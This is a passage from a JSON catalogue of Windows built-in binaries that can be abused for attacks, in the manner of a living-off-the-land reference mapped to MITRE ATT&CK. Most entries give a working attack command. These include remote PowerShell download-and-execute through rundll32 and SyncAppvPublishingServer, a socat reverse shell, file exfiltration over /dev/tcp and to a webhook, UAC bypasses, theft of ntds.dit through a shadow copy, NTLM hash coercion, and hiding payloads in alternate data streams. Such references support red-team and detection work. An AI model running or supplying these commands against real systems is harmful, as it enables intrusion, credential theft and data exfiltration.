Msconfig.exe", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "984": {"platform": "windows", "cmd": "ConfigSecurityPolicy.exe", "cmd_alias": "ConfigSecurityPolicy", "cmd_desc": "Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.", "function": "upload", "data": [{"Command": "ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile", "Description": "Upload file, credentials or data exfiltration in general", "Usecase": "Upload file", "Category": "Upload", "Privileges": "User", "MitreID": "T1567", "MitreLink": "https://attack.mitre.org/techniques/T1567/", "OperatingSystem": "Windows 10"}]}, "985": {"platform": "windows", "cmd": "Presentationhost.exe", "cmd_alias": "Presentationhost", "cmd_desc": "File is used for executing Browser applications", "function": "execute", "data": [{"Command": "Presentationhost.exe C:\\temp\\Evil.xbap", "Description": "Executes the target XAML Browser Application (XBAP) file", "Usecase": "Execute code within xbap files", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "986": {"platform": "windows", "cmd": "At.exe", "cmd_alias": "At", "cmd_desc": "Schedule periodic tasks", "function": "execute", "data": [{"Command": "C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\\Windows\\System32\\revshell.exe", "Description": "Create a recurring task to execute every day at a specific time.", "Usecase": "Create a recurring task, to eg. to keep reverse shell session(s) alive", "Category": "Execute", "Privileges": "Local Admin", "MitreID": "T1053", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1053", "OperatingSystem": "Windows 7 or older"}]}, "987": {"platform": "windows", "cmd": "Pktmon.exe", "cmd_alias": "Pktmon", "cmd_desc": "Capture Network Packets on the windows 10 with October 2018 Update or later.", "function": "reconnaissance", "data": [{"Command": "pktmon.exe start --etw", "Description": "Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop", "Usecase": "use this a built in network sniffer on windows 10 to capture senstive traffic", "Category": "Reconnaissance", "Privileges": "Administrator", "MitreID": "T1040", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1040", "OperatingSystem": "Windows 10 1809 and later"}, {"Command": "pktmon.exe filter add -p 445", "Description": "Select Desired ports for packet capture", "Usecase": "Look for interesting traffic such as telent or FTP", "Category": "Reconnaissance", "Privileges": "Administrator", "MitreID": "T1040", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1040", "OperatingSystem": "Windows 10 1809 and later"}]}, "988": {"platform": "windows", "cmd": "Rundll32.exe", "cmd_alias": "Rundll32", "cmd_desc": "Used by Windows to execute dll files", "function": "execute", "data": [{"Command": "rundll32.exe AllTheThingsx64,EntryPoint", "Description": "AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.", "Usecase": "Execute dll file", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "rundll32.exe \\\\10.10.10.10\\share\\payload.dll,EntryPoint", "Description": "Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.", "Usecase": "Execute DLL from SMB share.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/techniques/T1085", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');\"", "Description": "Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.", "Usecase": "Execute code from Internet", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");", "Description": "Use Rundll32.exe to execute a JavaScript script that runs calc.exe.", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}", "Description": "Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\")", "Description": "Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.", "Usecase": "Execute code from Internet", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "rundll32.exe -sta {CLSID}", "Description": "Use Rundll32.exe to load a registered or hijacked COM Server payload.  Also works with ProgID.", "Usecase": "Execute a DLL/EXE COM server payload or ScriptletURL code.", "Category": "Execute", "Privileges": "User", "MitreID": null, "MitreLink": null, "OperatingSystem": "Windows 10 (and likely previous versions)"}]}, "989": {"platform": "windows", "cmd": "Rundll32.exe", "cmd_alias": "Rundll32", "cmd_desc": "Used by Windows to execute dll files", "function": "ads", "data": [{"Command": "rundll32 \"C:\\ads\\file.txt:ADSDLL.dll\",DllMain", "Description": "Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).", "Usecase": "Execute code from alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "990": {"platform": "windows", "cmd": "Ilasm.exe", "cmd_alias": "Ilasm", "cmd_desc": "used for compile c# code into dll or exe.", "function": "compile", "data": [{"Command": "ilasm.exe C:\\public\\test.txt /exe", "Description": "Binary file used by .NET to compile c# code to .exe", "Usecase": "Compile attacker code on system. Bypass defensive counter measures.", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/techniques/T1127/", "OperatingSystem": "Windows 10,7"}, {"Command": "ilasm.exe C:\\public\\test.txt /dll", "Description": "Binary file used by .NET to compile c# code to dll", "Usecase": "A description of the usecase", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/techniques/T1127/"}]}, "991": {"platform": "windows", "cmd": "Findstr.exe", "cmd_alias": "Findstr", "cmd_desc": null, "function": "ads", "data": [{"Command": "findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe", "Description": "Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.", "Usecase": "Add a file to an alternate data stream to hide from defensive counter measures", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.txt:file.exe", "Description": "Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.", "Usecase": "Add a file to an alternate data stream from a webdav server to hide from defensive counter measures", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "992": {"platform": "windows", "cmd": "Findstr.exe", "cmd_alias": "Findstr", "cmd_desc": null, "function": "credentials", "data": [{"Command": "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml", "Description": "Search for stored password in Group Policy files stored on SYSVOL.", "Usecase": "Find credentials stored in cpassword attrbute", "Category": "Credentials", "Privileges": "User", "MitreID": "T1081", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1081", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "993": {"platform": "windows", "cmd": "Findstr.exe", "cmd_alias": "Findstr", "cmd_desc": null, "function": "download", "data": [{"Command": "findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe", "Description": "Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.", "Usecase": "Download/Copy file from webdav server", "Category": "Download", "Privileges": "User", "MitreID": "T1185", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1185", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "994": {"platform": "windows", "cmd": "Rpcping.exe", "cmd_alias": "Rpcping", "cmd_desc": "Used to verify rpc connection", "function": "credentials", "data": [{"Command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "Description": "Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.", "Usecase": "Capture credentials on a non-standard port", "Category": "Credentials", "Privileges": "User", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "995": {"platform": "windows", "cmd": "vbc.exe", "cmd_alias": "vbc", "cmd_desc": "Binary file used for compile vbs code", "function": "compile", "data": [{"Command": "vbc.exe /target:exe c:\\temp\\vbs\\run.vb", "Description": "Binary file used by .NET to compile vb code to .exe", "Usecase": "Compile attacker code on system. Bypass defensive counter measures.", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/techniques/T1127/", "OperatingSystem": "Windows 10,7"}, {"Command": "vbc -reference:Microsoft.VisualBasic.dll c:\\temp\\vbs\\run.vb", "Description": "Description of the second command", "Usecase": "A description of the usecase", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/techniques/T1127/", "OperatingSystem": "Windows 10,7"}]}, "996": {"platform": "windows", "cmd": "Esentutl.exe", "cmd_alias": "Esentutl", "cmd_desc": "Binary for working with Microsoft Joint Engine Technology (JET) database", "function": "copy", "data": [{"Command": "esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o", "Description": "Copies the source VBS file to the destination VBS file.", "Usecase": "Copies files from A to B", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit", "Description": "Copies a (locked) file using Volume Shadow Copy", "Usecase": "Copy/extract a locked file such as the AD Database", "Category": "Copy", "Privileges": "Admin", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/techniques/T1003/", "OperatingSystem": "Windows 10, Windows 2016 Server, Windows 2019 Server"}]}, "997": {"platform": "windows", "cmd": "Esentutl.exe", "cmd_alias": "Esentutl", "cmd_desc": "Binary for working with Microsoft Joint Engine Technology (JET) database", "function": "ads", "data": [{"Command": "esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o", "Description": "Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.", "Usecase": "Copy file and hide it in an alternate data stream as a defensive counter measure", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "esentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe /o", "Description": "Copies the source Alternate Data Stream (ADS) to the destination EXE.", "Usecase": "Extract hidden file within alternate data streams", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "esentutl.exe /y \\\\192.168.100.100\\webdav\\file.exe /d c:\\ADS\\file.txt:file.exe /o", "Description": "Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.", "Usecase": "Copy file and hide it in an alternate data stream as a defensive counter measure", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "998": {"platform": "windows", "cmd": "Esentutl.exe", "cmd_alias": "Esentutl", "cmd_desc": "Binary for working with Microsoft Joint Engine Technology (JET) database", "function": "download", "data": [{"Command": "esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o", "Description": "Copies the source EXE to the destination EXE file", "Usecase": "Use to copy files from one unc path to another", "Category": "Download", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "999": {"platform": "windows", "cmd": "Dfsvc.exe", "cmd_alias": "Dfsvc", "cmd_desc": "ClickOnce engine in Windows used by .NET", "function": "awl-bypass", "data": [{"Command": "rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo", "Description": "Executes click-once-application from Url", "Usecase": "Use binary to bypass Application whitelisting", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1000": {"platform": "windows", "cmd": "Replace.exe", "cmd_alias": "Replace", "cmd_desc": "Used to replace file with another file", "function": "copy", "data": [{"Command": "replace.exe C:\\Source\\File.cab C:\\Destination /A", "Description": "Copy file.cab to destination", "Usecase": "Copy files", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1001": {"platform": "windows", "cmd": "Replace.exe", "cmd_alias": "Replace", "cmd_desc": "Used to replace file with another file", "function": "download", "data": [{"Command": "replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A", "Description": "Download/Copy bar.exe to outdir", "Usecase": "Download file", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1002": {"platform": "windows", "cmd": "Infdefaultinstall.exe", "cmd_alias": "Infdefaultinstall", "cmd_desc": "Binary used to perform installation based on content inside inf files", "function": "execute", "data": [{"Command": "InfDefaultInstall.exe Infdefaultinstall.inf", "Description": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.", "Usecase": "Code execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1003": {"platform": "windows", "cmd": "Wsreset.exe", "cmd_alias": "Wsreset", "cmd_desc": "Used to reset Windows Store settings according to its manifest file", "function": "uac-bypass", "data": [{"Command": "wsreset.exe", "Description": "During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.", "Usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "Category": "UAC bypass", "Privileges": "User", "MitreID": "T1088", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1088", "OperatingSystem": "Windows 10"}]}, "1004": {"platform": "windows", "cmd": "Expand.exe", "cmd_alias": "Expand", "cmd_desc": "Binary that expands one or more compressed files", "function": "download", "data": [{"Command": "expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat", "Description": "Copies source file to destination.", "Usecase": "Use to copies the source file to the destination file", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1005": {"platform": "windows", "cmd": "Expand.exe", "cmd_alias": "Expand", "cmd_desc": "Binary that expands one or more compressed files", "function": "copy", "data": [{"Command": "expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat", "Description": "Copies source file to destination.", "Usecase": "Copies files from A to B", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1006": {"platform": "windows", "cmd": "Expand.exe", "cmd_alias": "Expand", "cmd_desc": "Binary that expands one or more compressed files", "function": "ads", "data": [{"Command": "expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat", "Description": "Copies source file to destination Alternate Data Stream (ADS)", "Usecase": "Copies files from A to B", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1007": {"platform": "windows", "cmd": "Regsvcs.exe", "cmd_alias": "Regsvcs", "cmd_desc": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies", "function": "execute", "data": [{"Command": "regsvcs.exe AllTheThingsx64.dll", "Description": "Loads the target .DLL file and executes the RegisterClass function.", "Usecase": "Execute dll file and bypass Application whitelisting", "Category": "Execute", "Privileges": "Local Admin", "MitreID": "T1121", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1008": {"platform": "windows", "cmd": "Regsvcs.exe", "cmd_alias": "Regsvcs", "cmd_desc": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies", "function": "awl-bypass", "data": [{"Command": "regsvcs.exe AllTheThingsx64.dll", "Description": "Loads the target .DLL file and executes the RegisterClass function.", "Usecase": "Execute dll file and bypass Application whitelisting", "Category": "AWL bypass", "Privileges": "Local Admin", "MitreID": "T1121", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1009": {"platform": "windows", "cmd": "Msiexec.exe", "cmd_alias": "Msiexec", "cmd_desc": "Used by Windows to execute msi files", "function": "execute", "data": [{"Command": "msiexec /quiet /i cmd.msi", "Description": "Installs the target .MSI file silently.", "Usecase": "Execute custom made msi file with attack code", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "msiexec /q /i http://192.168.100.3/tmp/cmd.png", "Description": "Installs the target remote & renamed .MSI file silently.", "Usecase": "Execute custom made msi file with attack code from remote server", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "msiexec /y \"C:\\folder\\evil.dll\"", "Description": "Calls DLLRegisterServer to register the target DLL.", "Usecase": "Execute dll files", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "msiexec /z \"C:\\folder\\evil.dll\"", "Description": "Calls DLLRegisterServer to un-register the target DLL.", "Usecase": "Execute dll files", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1010": {"platform": "windows", "cmd": "SyncAppvPublishingServer.exe", "cmd_alias": "SyncAppvPublishingServer", "cmd_desc": "Used by App-v to get App-v server lists", "function": "execute", "data": [{"Command": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX\"", "Description": "Example command on how inject Powershell code into the process", "Usecase": "Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 1709, Windows 10 1703, Windows 10 1607"}]}, "1011": {"platform": "windows", "cmd": "Eventvwr.exe", "cmd_alias": "Eventvwr", "cmd_desc": "Displays Windows Event Logs in a GUI window.", "function": "uac-bypass", "data": [{"Command": "eventvwr.exe", "Description": "During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.", "Usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "Category": "UAC bypass", "Privileges": "User", "MitreID": "T1088", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1088", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1012": {"platform": "windows", "cmd": "Schtasks.exe", "cmd_alias": "Schtasks", "cmd_desc": "Schedule periodic tasks", "function": "execute", "data": [{"Command": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr c:\\some\\directory\\revshell.exe", "Description": "Create a recurring task to execute every minute.", "Usecase": "Create a recurring task, to eg. to keep reverse shell session(s) alive", "Category": "Execute", "Privileges": "User", "MitreID": "T1053", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1053", "OperatingSystem": "Windows"}]}, "1013": {"platform": "windows", "cmd": "Bash.exe", "cmd_alias": "Bash", "cmd_desc": "File used by Windows subsystem for Linux", "function": "execute", "data": [{"Command": "bash.exe -c calc.exe", "Description": "Executes calc.exe from bash.exe", "Usecase": "Performs execution of specified file, can be used as a defensive evasion.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}, {"Command": "bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\"", "Description": "Executes a reverseshell", "Usecase": "Performs execution of specified file, can be used as a defensive evasion.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}, {"Command": "bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'", "Description": "Exfiltrate data", "Usecase": "Performs execution of specified file, can be used as a defensive evasion.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}]}, "1014": {"platform": "windows", "cmd": "Bash.exe", "cmd_alias": "Bash", "cmd_desc": "File used by Windows subsystem for Linux", "function": "awl-bypass", "data": [{"Command": "bash.exe -c calc.exe", "Description": "Executes calc.exe from bash.exe", "Usecase": "Performs execution of specified file, can be used to bypass Application Whitelisting.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}]}, "1015": {"platform": "windows", "cmd": "Installutil.exe", "cmd_alias": "Installutil", "cmd_desc": "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies", "function": "awl-bypass", "data": [{"Command": "InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll", "Description": "Execute the target .NET DLL or EXE.", "Usecase": "Use to execute code and bypass application whitelisting", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1118", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1118", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1016": {"platform": "windows", "cmd": "Installutil.exe", "cmd_alias": "Installutil", "cmd_desc": "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies", "function": "execute", "data": [{"Command": "InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll", "Description": "Execute the target .NET DLL or EXE.", "Usecase": "Use to execute code and bypass application whitelisting", "Category": "Execute", "Privileges": "User", "MitreID": "T1118", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1118", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1017": {"platform": "windows", "cmd": "Dllhost.exe", "cmd_alias": "Dllhost", "cmd_desc": "Used by Windows to DLL Surrogate COM Objects", "function": "execute", "data": [{"Command": "dllhost.exe /Processid:{CLSID}", "Description": "Use dllhost.exe to load a registered or hijacked COM Server payload.", "Usecase": "Execute a DLL Surrogate COM Object.", "Category": "Execute", "Privileges": "User", "MitreID": "T1546.015", "MitreLink": "https://attack.mitre.org/techniques/T1546/015/", "OperatingSystem": "Windows 10 (and likely previous versions)"}]}, "1018": {"platform": "windows", "cmd": "Msbuild.exe", "cmd_alias": "Msbuild", "cmd_desc": "Used to compile and execute code", "function": "awl-bypass", "data": [{"Command": "msbuild.exe pshell.xml", "Description": "Build and execute a C# project stored in the target XML file.", "Usecase": "Compile and run code", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1019": {"platform": "windows", "cmd": "Msbuild.exe", "cmd_alias": "Msbuild", "cmd_desc": "Used to compile and execute code", "function": "execute", "data": [{"Command": "msbuild.exe project.csproj", "Description": "Build and execute a C# project stored in the target csproj file.", "Usecase": "Compile and run code", "Category": "Execute", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1020": {"platform": "windows", "cmd": "Print.exe", "cmd_alias": "Print", "cmd_desc": "Used by Windows to send files to the printer", "function": "ads", "data": [{"Command": "print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe", "Description": "Copy file.exe into the Alternate Data Stream (ADS) of file.txt.", "Usecase": "Hide binary file in alternate data stream to potentially bypass defensive counter measures", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1021": {"platform": "windows", "cmd": "Print.exe", "cmd_alias": "Print", "cmd_desc": "Used by Windows to send files to the printer", "function": "copy", "data": [{"Command": "print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe", "Description": "Copy FileToCopy.exe to the target C:\\ADS\\CopyOfFile.exe", "Usecase": "Copy files", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "print /D:C:\\OutFolder\\outfile.exe \\\\WebDavServer\\Folder\\File.exe", "Description": "Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe.", "Usecase": "Copy/Download file from remote server", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1022": {"platform": "windows", "cmd": "Pcwrun.exe", "cmd_alias": "Pcwrun", "cmd_desc": "Program Compatibility Wizard", "function": "execute", "data": [{"Command": "Pcwrun.exe c:\\temp\\beacon.exe", "Description": "Open the target .EXE file with the Program Compatibility Wizard.", "Usecase": "Proxy execution of binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1023": {"platform": "windows", "cmd": "Jsc.exe", "cmd_alias": "Jsc", "cmd_desc": "Binary file used by .NET to compile javascript code to .exe or .dll format", "function": "compile", "data": [{"Command": 